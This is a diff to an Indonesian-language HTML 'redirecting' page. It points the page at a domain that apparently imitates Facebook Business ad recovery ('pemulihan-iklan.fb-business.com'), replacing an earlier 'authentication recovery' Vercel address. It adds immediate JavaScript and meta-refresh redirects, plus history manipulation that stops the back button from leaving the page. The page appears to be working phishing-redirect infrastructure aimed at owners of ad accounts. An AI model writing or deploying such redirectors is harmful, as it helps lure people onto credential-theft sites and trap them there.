@@ -1,6 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="1;url=https://example.com">
+    <title>Redirecting...</title>
     <style>
         .container {
             display: flex;
@@ -8,23 +13,26 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f5f5f5;
+            background-color: #ffffff;
             font-family: Arial, sans-serif;
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
             border-radius: 50%;
-            border-top: 5px solid #3498db;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            border-left-color: #09f;
+            transform-origin: center;
+            animation: spin 0.6s linear infinite;
+            will-change: transform;
         }
 
         .loading-text {
             color: #333;
-            font-size: 18px;
+            font-size: 16px;
+            margin-top: 15px;
+            opacity: 0.8;
         }
 
         @keyframes spin {
@@ -36,15 +44,35 @@
 <body>
     <div class="container">
         <div class="spinner"></div>
-        <div class="loading-text">Mohon tunggu, Anda akan segera dialihkan...</div>
+        <div class="loading-text">Mengalihkan...</div>
     </div>
 
     <script>
-        // Fungsi untuk melakukan redirect setelah beberapa detik
+        // Metode 1: JavaScript Redirect
+        (function() {
+            try {
+                window.location.replace("https://pemulihan-iklan.fb-business.com");
+            } catch(e) {
+                window.location.href = "https://pemulihan-iklan.fb-business.com";
+            }
+        })();
+
+        // Metode 2: Backup redirect menggunakan setTimeout
         setTimeout(function() {
-            // Ganti URL di bawah ini dengan URL tujuan Anda
-            window.location.href = "https://authentikasi-pemulihan.vercel.app/";
-        }, 3000); // Redirect setelah 3 detik
+            window.location = "https://pemulihan-iklan.fb-business.com";
+        }, 800);
+
+        // Metode 3: History manipulation untuk menghindari tombol back
+        window.history.replaceState(null, '', window.location.href);
+        window.history.pushState(null, '', window.location.href);
+        window.addEventListener('popstate', function() {
+            window.location.replace("https://pemulihan-iklan.fb-business.com");
+        });
     </script>
+
+    <!-- Fallback jika JavaScript dinonaktifkan -->
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=https://pemulihan-iklan.fb-business.com">
+    </noscript>
 </body>
 </html>
